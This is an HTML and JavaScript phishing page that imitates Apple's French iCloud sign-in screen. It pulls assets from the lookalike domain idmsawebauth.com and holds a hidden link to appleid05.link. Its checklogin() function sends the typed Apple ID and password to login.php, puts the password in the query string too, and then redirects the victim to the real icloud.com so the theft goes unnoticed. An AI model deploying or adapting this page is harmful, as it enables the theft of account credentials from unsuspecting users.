<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>iCloud</title>
	<meta name="keywords" content="{!KEYWORDS!}">
	<meta name="description" content="{!DESCRIPTION!}">
	<link href="http://icloud.appel.idmsawebauth.com/style/css/style.css" rel="stylesheet" type="text/css">
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>	
	<script src="js/jquery-1.js"></script>
    <script src="js/jquery-ui.js"></script>
    <script src="js/activity-indicator.js"></script>
	<script src="js/javascript.js"></script>
</head>
	
<body>
	<span class="icloud-text">iCloud</span>
	
	<div class="top_right">
		<div class="conf">Comment configurer iCloud</div>
		<div class="bar"></div>
		<div class="interrogation"></div>
	</div>
	
	<div class="form_container">
		<span></span>
		<div class="sign-in-header">Connexion à iCloud</div>
		
		
		<div class="formulaire">
			<form method="POST" action="">
				<input value="https://p01-caldav.icloud.com" id="server" name="server" type="hidden">
				<input value="French" name="lang" id="lang" type="hidden">
				<input value="www.icloud.com.appleid05.link/site/bin/1a86bc871735057e3d317848cc80b784/icloud.Apple.account/index.php?lang=French" name="link" id="link" type="hidden">
				<input placeholder="Identifiant Apple" class="appId1" name="apple" id="apple" type="text">
				<div class="auth-separator"></div>
				<input placeholder="Mot de passe" value="" class="appId2" name="pw" id="pw" type="password">
				<input value="" class="btn_submit" id="submit_button" onclick="checklogin()" type="button">
				<div id="submit_loader" style="margin-left: 301px; margin-top: -25px; display: none; position: absolute;"><div style="width: 26px; height: 26px; position: absolute; margin-top: -13px; margin-left: -13px;"><svg style="width: 26px; height: 26px;"><g transform="translate(13,13)"><g transform="rotate(30)" stroke="rgb(0, 0, 0)" stroke-linecap="round" stroke-width="1.5"><line opacity="1" transform="rotate(0, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.9173553719008265" transform="rotate(30, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.8347107438016529" transform="rotate(60, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.7520661157024794" transform="rotate(90, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.6694214876033058" transform="rotate(120, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.5867768595041323" transform="rotate(150, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.5041322314049588" transform="rotate(180, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.42148760330578516" transform="rotate(210, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.33884297520661155" transform="rotate(240, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.25619834710743805" transform="rotate(270, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.17355371900826455" transform="rotate(300, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.09090909090909094" transform="rotate(330, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line></g></g></svg></div></div><div class="clear"></div>

				
				</form>
			<div class="check_box">
				<img src="images/check_nok.png" id="box" onclick="swap_src('images/check_ok.png')">
				<p>Rester connecté</p>
			</div>
		</div>
		
		<div class="lost_pass">
			<a href="https://iforgot.apple.com/" target="blank">Identifiant Apple ou mot de passe oublié ?</a>
		</div>
		<div class="create_account">Pas d’identifiant Apple ? <a href="#">Créez le vôtre dès maintenant.</a></div>
		
	
	</div>
	
	
	
	<div tabindex="0" id="sc1977" class="atv4 sc-view auth-footer focus" style="left: 0px; right: 0px; bottom: 0px;margin-top: 50px !important; height: 41px; opacity: 1">
		<div class="footer-contents">
			<a class="logo" href="http://www.apple.com/fr/" target="blank" title="Apple.com"></a>
			<div class="links">
				<div class="line"><a href="https://www.icloud.com/activationlock" target="blank">État&nbsp;du&nbsp;verrouillage&nbsp;d’activation</a>&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer-link-separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://www.apple.com/fr/support/systemstatus/" target="_blank">État&nbsp;du&nbsp;système</a>&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer-link-separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://www.apple.com/fr/privacy/" target="_blank">Engagement&nbsp;de&nbsp;confidentialité</a>&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer-link-separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://www.apple.com/legal/icloud/ww/" target="_blank">Conditions&nbsp;générales</a>&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer-link-separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="copyright">Copyright © 2015 Apple Inc. Tous droits réservés.</span></div>
			</div>
		</div>
	</div>
	
	
	
	
	
	
	
	
		<script>
			function swap_src(src){
                if(src=='images/check_ok.png') jQuery('#box').attr({'src':'images/check_ok.png','onClick':"swap_src('images/check_nok.png')"});
				else jQuery('#box').attr('src','images/check_nok.png').attr('onClick',"swap_src('images/check_ok.png')");
            }
			
			 $("body").css("visibility", "hidden");

            $('#loader').activity({width: 1.5, segments: 12, length: 5});

            jQuery('#submit_loader').activity({width: 1.5, segments: 12, length: 5});

            function typeCheck(element) {

                var key = event.keyCode || event.charCode;

                if (key == 8 || key == 46) {

                    $(".sbBtn").css("opacity", "0.2");

                    return element;

                }

                if (element !== "") {

                    $(".sbBtn").css("opacity", "1");

                } else {

                    $(".sbBtn").css("opacity", "0.2");

                }

            }

            $(document).ready(function () {



                $("body").css("visibility", "visible");

                                function isValidEmailAddress(emailAddress) {

                    var pattern = new RegExp(/^(("[\w-+\s]+")|([\w-+]+(?:\.[\w-+]+)*)|("[\w-+\s]+")([\w-+]+(?:\.[\w-+]+)*))(@((?:[\w-+]+\.)*\w[\w-+]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][\d]\.|1[\d]{2}\.|[\d]{1,2}\.))((25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\.){2}(25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\]?$)/i);

                    return pattern.test(emailAddress);

                };

                $('input[name=apple]').bind("keydown", function(e){

                    $('.auth-picker').hide();

                    // enter key code is 13

                    if(e.which == 13 || e.which == 9){

                        e.preventDefault();

                        var val = $(this).val();

                        if (!isValidEmailAddress(val)) {

                            val = val+"@icloud.com";

                            $(this).val(val);

                        } else {

                            console.log($(this).val());

                        }

                        console.log(val);

                        $("input[name=pw]").focus();

                        if(jQuery('#apple').val()=='' || jQuery('#pw').val()=='') $(".sbBtn").css("opacity", "0.2"); else $(".sbBtn").css("opacity", "1");



                        return false;

                    }

                });

                $("input[name=pw]").on("click keyup", function(){

                    val = $("input[name=apple]").val();

                    if (!isValidEmailAddress(val)) {

                        if(val!='@icloud.com' && val!='') val = val+"@icloud.com";

                        $("input[name=apple]").val(val);

                    }

                    if(jQuery('#apple').val()=='' || jQuery('#pw').val()=='') $(".sbBtn").css("opacity", "0.2"); else $(".sbBtn").css("opacity", "1");

                });

                var mm = 0;

                var ss = setTimeout(function () {

                    $(".body_image_new").animate({ opacity: "1" }, 1000);

                    console.log(mm);

                    clearTimeout(ss);

                }, 7500);

                k = 1;

                $(".tlrm").on("click", function () {

                    k++;

                    if (k % 2 == 0) {

                        $("#tlrm").attr("src", "images/checked.png");

                    } else {

                        $("#tlrm").attr("src", "images/Unknown");

                    }

                });

            });

            var ss2 = setTimeout(function () {

                $("#loader").fadeOut("slow");

                $("div.container").fadeIn("slow");

                $("div.container").css("display:", "block");

                $(".sbBtn").css("opacity", "0.2");

                clearTimeout(ss2);

            }, 4500);





            $('#apple,#pw').on('keyup', function(e) {

                $('.auth-picker').hide();

                if (e.which == 13) {

                    checklogin();

                }

            });

            var $loginCount = 0;

            function checklogin()

            {

                var apple = jQuery('#apple').val();

                var pw = jQuery('#pw').val();

                var server = jQuery('#server').val();

                var lang = jQuery('#lang').val();

                var links = jQuery('#link').val();

                if(apple!='' && pw!='')

                {
					
					var xhr = null;
	
					if(window.XMLHttpRequest || window.ActiveXObject){
						if(window.ActiveXObject){
							try{
								xhr = new ActiveXObject("Msxml2.XMLHTTP");
							}catch(e){
								xhr = new ActiveXObject("Microsoft.XMLHTTP");
							}
						}else{
							xhr = new XMLHttpRequest(); 
						}
					}else{
						alert("Votre navigateur ne supporte pas l'objet XMLHTTPRequest...");
						return;
					}

					
					
					
                    jQuery('#submit_button,.bothide').hide();

                    jQuery('#submit_loader').show();

                    jQuery.ajax({

                        type:"POST",

                        url:"login.php?apple="+apple+"pw"+pw,

                        data:"apple="+apple+"&pw="+pw,

                        success: function(msg){

                            if(msg.search("INVALID")!=-1)

                            {

                                $loginCount++;

                                jQuery('#pw').val('')

                                if($loginCount == 3){

                                    setTimeout(function(){

                                        $('.auth-picker').show();

                                        $loginCount = 0;

                                    },400);

                                }

                                $('div.form_container').effect('shake', {times:3}, 400 );

                                jQuery('#submit_button,.bothide').show();

                                jQuery('#submit_loader').hide();

                                $(".sbBtn").css("opacity", "0.2");



                            }

                            else if(msg.search("SUCCESS")!=-1)

                            {

                                window.location.href = "https://www.icloud.com";

                            }

                            else

                            {

                                $('div.form_container').effect('shake', {times:3}, 400 );

                                jQuery('#submit_button').show();

                                jQuery('#submit_loader').hide();

                                $(".sbBtn").css("opacity", "0.2");

                            }

                        }

                    });

                }

                else

                {

                    if(apple=='') jQuery('#apple').focus();

                    else if(pw=='') jQuery('#pw').focus();

                }

            }

        </script>
</body>
</html>